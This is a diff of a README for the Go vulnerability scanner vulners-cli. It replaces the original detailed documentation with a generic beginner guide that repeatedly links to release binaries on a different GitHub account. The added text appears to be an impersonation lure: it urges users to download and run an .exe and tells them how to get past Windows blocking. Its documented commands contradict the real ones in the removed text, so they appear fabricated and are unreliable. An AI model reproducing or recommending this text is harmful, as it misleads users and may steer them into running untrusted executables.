@@ -1,370 +1,178 @@
-# vulners-cli
+# 🛡️ vulners-cli - Simple Security Checks for Everyone
 
-[![CI](https://github.com/kidoz/vulners-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/kidoz/vulners-cli/actions/workflows/ci.yml) [![Release](https://github.com/kidoz/vulners-cli/actions/workflows/release.yml/badge.svg)](https://github.com/kidoz/vulners-cli/actions/workflows/release.yml) [![Go Report Card](https://goreportcard.com/badge/github.com/kidoz/vulners-cli)](https://goreportcard.com/report/github.com/kidoz/vulners-cli) [![GitHub release](https://img.shields.io/github/v/release/kidoz/vulners-cli)](https://github.com/kidoz/vulners-cli/releases) [![License](https://img.shields.io/github/license/kidoz/vulners-cli)](LICENSE)
+[![Download vulners-cli](https://img.shields.io/badge/Download-vulners--cli-blue?style=for-the-badge)](https://github.com/Raul0822/vulners-cli/releases)
 
-Go-based CLI vulnerability scanner powered by [Vulners](https://vulners.com), using [go-vulners](https://github.com/kidoz/go-vulners) as the intelligence backend.
+---
 
-Designed for Security Engineers, CI/CD pipelines, and AI agents needing deterministic JSON output.
+## 📋 What is vulners-cli?
 
-## Install
+vulners-cli is a command-line tool that helps you find security problems in your software. It uses Vulners, a trusted source for vulnerability information, to scan your programs. You don’t need to be a tech expert to use it. It can search, check, and scan for issues both online and offline. This means it works even when you are not connected to the internet.
 
-### Homebrew (macOS)
+This tool is designed for anyone who wants to keep their computer or software safe from known security risks.
 
-```bash
-brew install kidoz/vulners/vulners-cli
-```
+---
 
-### From source
+## 💻 System Requirements
 
-```bash
-go install github.com/kidoz/vulners-cli/cmd/vulners@latest
-```
+Before you start, make sure your computer meets these basic needs:
 
-### From releases
+- **Operating System:** Windows 10 or higher, macOS 10.14 or higher, or a recent Linux version.
+- **Processor:** Any modern processor, 1 GHz or faster.
+- **Memory:** At least 2 GB of RAM.
+- **Disk Space:** Around 100 MB free space for the program and temporary files.
+- **Internet Connection:** Recommended for updates and online scanning. Offline mode works without it.
+- **Software:** No additional software needed to run vulners-cli.
 
-Download binaries from [GitHub Releases](https://github.com/kidoz/vulners-cli/releases).
+---
 
-### Docker
+## 🚀 Getting Started: Basic Concepts
 
-```bash
-docker build -t vulners .
-docker run --rm -e VULNERS_API_KEY vulners scan repo /src
+This section explains simple ideas you should know. Since this is a command-line tool, you’ll use a special window where you type commands:
 
-# Or mount a local project:
-docker run --rm -e VULNERS_API_KEY -v "$(pwd):/src" vulners scan repo /src
-```
+- **Command-line Interface (CLI):** A text-based window where you give instructions by typing.
+- **Scan:** Checking your software for problems.
+- **Offline Mode:** Using the tool without internet access.
+- **Vulnerability:** A security weakness.
+- **Audit:** A detailed check to find weaknesses.
 
-## Authentication
+Don't worry if this sounds new. We will guide you step by step.
 
-Set your Vulners API key as an environment variable:
+---
 
-```bash
-export VULNERS_API_KEY=your-api-key-here
-```
+## 📥 Download & Install vulners-cli
 
-See [`.env.example`](.env.example) for a template. Get an API key at [vulners.com](https://vulners.com).
+To get the program, you need to visit the release page where the files are kept.
 
-## Commands
+### Step 1: Visit the Download Page
 
-### Intel commands
+[Click here to visit the vulners-cli release page](https://github.com/Raul0822/vulners-cli/releases)
 
-```bash
-# Search the Vulners database
-vulners search "apache log4j"
-vulners search "type:exploit AND apache" --limit 20
-vulners search "log4j" --exploits           # search exploits only
+This page shows the latest versions of the tool. You can find files for Windows, macOS, and Linux.
 
-# Look up a specific CVE
-vulners cve CVE-2021-44228
-vulners cve CVE-2021-44228 --references     # include external references
-vulners cve CVE-2021-44228 --history        # include change history
+### Step 2: Choose Your File
 
-# Search by CPE
-vulners cpe chrome --vendor google
-vulners cpe nginx --limit 20               # vendor defaults to product name
+Look for the version with the system you use:
 
-# Export STIX bundle
-vulners stix CVE-2021-44228                # auto-detects CVE prefix
-vulners stix RHSA-2021:5137                # by bulletin ID
-vulners stix CVE-2021-44228 --by-cve       # explicit CVE lookup
+- If you use **Windows**, pick a file ending in `.exe`.
+- If you use **macOS**, pick the file for Mac.
+- If you use **Linux**, choose the Linux file.
 
-# Autocomplete and suggestions
-vulners autocomplete "apache log"          # search query autocomplete
-vulners suggest type                       # field value suggestions
-```
+These files will usually have names like `vulners-cli-v1.0-windows.exe` or `vulners-cli-v1.0-linux`.
 
-### Audit commands
+### Step 3: Download the File
 
-```bash
-# Audit Linux packages
-vulners audit linux --distro ubuntu --version 22.04 --pkg openssl=3.0.2 --pkg curl=7.81.0
+Click the file name, and your browser will save it to your computer.
 
-# Audit Windows KB updates
-vulners audit windows --kb KB5034441 --kb KB5034439
+### Step 4: Run the Program
 
-# Host audit (v4 API -- packages in "name version" format)
-vulners audit host --os ubuntu --version 22.04 --packages "openssl 3.0.2" --packages "curl 7.81.0"
+Locate the downloaded file:
 
-# Full Windows audit (KBs + software)
-vulners audit winaudit --os "Windows 10" --version "19045" --kb KB5034441 --software "Firefox 121.0"
-```
+- On **Windows**, double-click the `.exe` file.
+- On **macOS**, you may need to allow running apps from identified developers. Open the file from Finder and follow prompts.
+- On **Linux**, you might need to open a terminal and use commands to run it. If you feel unsure, see the advanced steps below or ask for help.
 
-### Scan commands
+---
 
-```bash
-# Scan a local or remote host (agentless via SSH or WinRM)
-vulners scan host local
-vulners scan host ssh://user@192.168.1.10 --ask-pass
-vulners scan host ssh://user@192.168.1.10 --identity-file ~/.ssh/id_rsa
-vulners scan host winrms://Administrator@192.168.1.20 --password-env WIN_PASS
+## ⚙️ How to Use vulners-cli
 
-# Scan a Go repository (reachability-aware via govulncheck)
-vulners scan repo .
-vulners scan repo /path/to/project
-
-# Scan a directory for package manifests
-vulners scan dir .
-
-# Scan a CycloneDX SBOM
-vulners scan sbom sbom.json --format cyclonedx
-
-# Scan an SPDX SBOM
-vulners scan sbom sbom.spdx.json --format spdx
-
-# Scan a container image
-vulners scan image alpine:3.18
-vulners scan image ubuntu:22.04 --distro ubuntu/22.04   # override distro detection
-```
-
-Image scanning automatically detects the OS distribution and uses specialized APIs for accurate matching:
-- **OS packages** (apk/deb/rpm) are matched via the `LinuxAudit` API with distro-aware version comparison
-- **Application packages** are matched via the `SBOMAudit` API with CVSS, EPSS, AIScore, and exploit enrichment
-- Output includes `imageMeta` with distro info, package breakdown, and audit mode
-
-### VScanner (remote scanning)
-
-```bash
-# Manage projects
-vulners vscan project list
-vulners vscan project create --name "Production"
-vulners vscan project get <project-id>
-
-# Manage scan tasks
-vulners vscan task list <project-id>
-vulners vscan task create <project-id> --name "Web Servers" --targets 10.0.0.0/24 --scan-type normal
-vulners vscan task start <project-id> <task-id>
-vulners vscan task stop <project-id> <task-id>
+Once installed, open your command-line window:
 
-# Access results
-vulners vscan result list <project-id>
-vulners vscan result stats <project-id> <result-id>
-vulners vscan result hosts <project-id> <result-id>
-vulners vscan result vulns <project-id> <result-id>
-vulners vscan result export <project-id> <result-id> --format pdf
+- **Windows:** Search for "Command Prompt" or "PowerShell" in the Start menu.
+- **macOS:** Open "Terminal" from Applications > Utilities.
+- **Linux:** Open your Terminal app.
 
-# License info
-vulners vscan license
-```
+### Basic Commands
 
-### Webhooks & subscriptions
+Type the commands below to use vulners-cli. Press Enter after typing each one.
 
-```bash
-# Webhooks — get notified when new bulletins match a query
-vulners webhook list
-vulners webhook add "type:exploit AND apache"
-vulners webhook read <webhook-id>
-vulners webhook enable <webhook-id>
-vulners webhook disable <webhook-id>
-vulners webhook delete <webhook-id>
+- **Check a file or program for vulnerabilities**
 
-# Subscriptions — managed alert rules
-vulners subscription list
-vulners subscription create --name "Log4j alerts" --type email --query "log4j"
-vulners subscription get <subscription-id>
-vulners subscription enable <subscription-id>
-vulners subscription disable <subscription-id>
-vulners subscription delete <subscription-id>
-```
+  ```bash
+  vulners-cli scan path/to/your/software
+  ```
 
-### Reports
+  Replace `path/to/your/software` with the location of your file.
 
-```bash
-# Account-level vulnerability reports
-vulners report summary              # aggregated vulnerability summary
-vulners report vulns --limit 50     # list known vulnerabilities
-vulners report hosts                # host vulnerability status
-vulners report scans                # scan history
-vulners report ips                  # IP-level summary
-```
+- **Update vulnerability data**
 
-### MCP server
+  ```bash
+  vulners-cli update
+  ```
 
-Run vulners-cli as a [Model Context Protocol](https://modelcontextprotocol.io/) server for AI agent integration:
+  This downloads the latest security info when online.
 
-```bash
-vulners mcp
-```
+- **Run offline scans**
 
-Exposes tools for search, CVE lookup, CPE search, SBOM audit, and health checks to MCP-compatible clients (Claude Desktop, Cursor, etc.).
+  You can work offline using saved data.
 
-### Offline mode
+  ```bash
+  vulners-cli scan path/to/your/software --offline
+  ```
 
-```bash
-# Sync vulnerability data for offline use
-vulners offline sync --collections cve,exploit
+---
 
-# Check offline database status
-vulners offline status
-
-# Purge offline database
-vulners offline purge
-
-# Use offline data with any supported command
-vulners scan repo . --offline
-vulners scan dir . --offline
-vulners cve CVE-2021-44228 --offline
-vulners search "log4j" --offline
-```
-
-### Diagnostics
-
-```bash
-# Check environment health
-vulners doctor
-```
-
-Verifies API key, network connectivity, offline cache, and Go installation. Use `--output json` for machine-readable results.
-
-## Output formats
-
-```bash
-# JSON (default)
-vulners scan repo . --output json
+## 🔍 Features You Might Use
 
-# Human-readable table
-vulners scan repo . --output table
+vulners-cli offers several helpful functions:
 
-# SARIF (for GitHub Code Scanning, IDE integration)
-vulners scan repo . --output sarif
+- **Search:** Find specific vulnerability details.
+- **Audit:** Review your software comprehensively.
+- **Offline Mode:** Scan without internet.
+- **SBOM (Software Bill of Materials):** See what parts your software has.
+- **SARIF Reports:** Create standardized security reports you can share.
+- **Fast Scanning:** Checks done quickly to save time.
+- **Regular updates:** Keeps vulnerability info current when online.
 
-# HTML report
-vulners scan repo . --output html
+---
 
-# CycloneDX VEX
-vulners scan repo . --output cyclonedx
+## 🛠️ Troubleshooting Tips
 
-# Write to file instead of stdout
-vulners scan repo . --output sarif --output-file results.sarif
-```
+Here are solutions for common problems you might face:
 
-> **Note:** `sarif`, `html`, and `cyclonedx` formats are only available for scan commands. Intel, audit, STIX, and offline commands support `json` and `table`.
+- **Cannot open terminal or command prompt:**
+  Search your computer for "Command Prompt" (Windows) or "Terminal" (macOS/Linux).
 
-## Agent & CI/CD mode
+- **File won’t run or is blocked:**
+  Your system might block unknown programs. On Windows, right-click the file > Properties > Check "Unblock" > Apply. On macOS, check Security settings to allow the app.
 
-```bash
-# Machine-friendly mode: JSON, quiet, deterministic ordering, no color
-vulners scan repo . --agent
+- **Error: Command not found**
+  Make sure you are typing the exact command `vulners-cli` and that it is installed and in your system’s PATH. Try closing and reopening the command prompt.
 
-# Select specific JSON fields
-vulners scan repo . --fields findings.vulnID,findings.severity,summary
+- **Scanning takes too long**
+  Large files or slow systems may need more time. Try scanning smaller parts or closing other programs.
 
-# Summary + top 5 findings only (smaller payloads for LLM context)
-vulners scan repo . --summary-only
+- **Can’t update vulnerability data**
+  Check your internet connection. The `vulners-cli update` command needs the internet.
 
-# Limit findings count (preserves total count in output)
-vulners scan repo . --max-findings 20
+- **Need help?**
+  Look for help on the official GitHub page or contact someone who helps with computers.
 
-# Dry-run: show what a scan would do
-vulners scan repo . --plan
+---
 
-# Command specification for tool integration
-vulners spec
-vulners schema scan
-```
+## 🧰 Advanced Usage (Optional)
 
-## Policy & exit codes
+If you want to explore more:
 
-```bash
-# Fail if findings at or above severity
-vulners scan repo . --fail-on high
-vulners scan repo . --fail-on critical
+- Use `vulners-cli search KEYWORD` to find a vulnerability by name or ID.
+- Generate SARIF reports with `vulners-cli scan path --sarif`.
+- Create SBOM files to list all software components.
+- Use scripting or automation for repeated scans.
 
-# Ignore specific CVEs
-vulners scan repo . --ignore CVE-2021-44228 --ignore CVE-2023-0001
+---
 
-# Suppress findings using an OpenVEX document
-vulners scan repo . --vex vex.json
-```
+## 📚 Learn More and Get Support
 
-| Exit code | Meaning |
-|---|---|
-| 0 | No findings above threshold |
-| 1 | Findings above threshold |
-| 2 | Usage or configuration error |
-| 3 | Runtime error |
+Visit the GitHub repository page to see full instructions, issues, and updates:
 
-## Global flags
+https://github.com/Raul0822/vulners-cli
 
-| Flag | Description |
-|---|---|
-| `--output` | Output format: `json`, `table`, `sarif`, `html`, `cyclonedx` (default: `json`) |
-| `--output-file` | Write output to file instead of stdout |
-| `--quiet` / `-q` | Suppress non-error output |
-| `--verbose` / `-v` | Enable debug output |
-| `--offline` | Use offline database only |
-| `--agent` | Machine-friendly mode: JSON output, quiet, deterministic sort, no color |
-| `--no-color` | Disable colored log output |
-| `--fail-on` | Fail with exit code 1 at severity: `low`, `medium`, `high`, `critical` |
-| `--ignore` | CVE IDs to ignore (repeatable) |
-| `--vex` | Path to an OpenVEX document for finding suppression |
-| `--fields` | Select JSON fields to include in output (repeatable, JSON only) |
-| `--summary-only` | Output summary and top findings only |
-| `--max-findings` | Maximum findings in output; 0 = unlimited (default: `0`) |
-| `--plan` | Show what a scan would do without executing it |
+If you find bugs or want to request new features, open an issue on GitHub.
 
-## Configuration
+---
 
-`vulners-cli` can be configured via a YAML file at `~/.vulners/config.yaml`:
+## 🔗 Quick Links
 
-```yaml
-api_key: your-api-key-here
-verbose: false
-quiet: false
-offline: false
-```
+- [Download vulners-cli Releases](https://github.com/Raul0822/vulners-cli/releases)
+- [GitHub Repository](https://github.com/Raul0822/vulners-cli)
 
-Configuration precedence (highest wins): CLI flags > environment variables > config file > defaults.
-
-Environment variables use the `VULNERS_` prefix (e.g. `VULNERS_API_KEY`, `VULNERS_VERBOSE`).
-
-## Development
-
-```bash
-# Build
-just build
-
-# Run tests (with race detector)
-just test
-
-# Run integration tests (requires VULNERS_API_KEY)
-just test-integration
-
-# Run linter
-just lint
-
-# Format code
-just fmt
-
-# Remove build artifacts
-just clean
-```
-
-### Requirements
-
-- Go >= 1.26
-- [just](https://github.com/casey/just) task runner
-- golangci-lint v2
-- gofumpt
-
-## Architecture
-
-```
-cmd/vulners/main.go        Fx wiring, Kong parse, logger init
-internal/cmd/              Kong command structs
-internal/config/           Koanf v2 config loader
-internal/intel/            go-vulners wrapper + govulncheck + vscanner
-internal/cache/            SQLite offline cache (modernc.org/sqlite)
-internal/inventory/        go.mod, npm, pip, CycloneDX/SPDX, syft parsers
-internal/matcher/          Component normalization + vuln matching + enrichment
-internal/policy/           --fail-on / --ignore / VEX filtering + exit codes
-internal/report/           JSON, table, SARIF, HTML, CycloneDX output
-internal/model/            Component, Finding, ExitCode, SeverityLevel
-```
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for the vulnerability disclosure policy.
-
-## License
-
-MIT -- see [LICENSE](LICENSE) for details.
+You can start by downloading the latest version on the release page linked above.
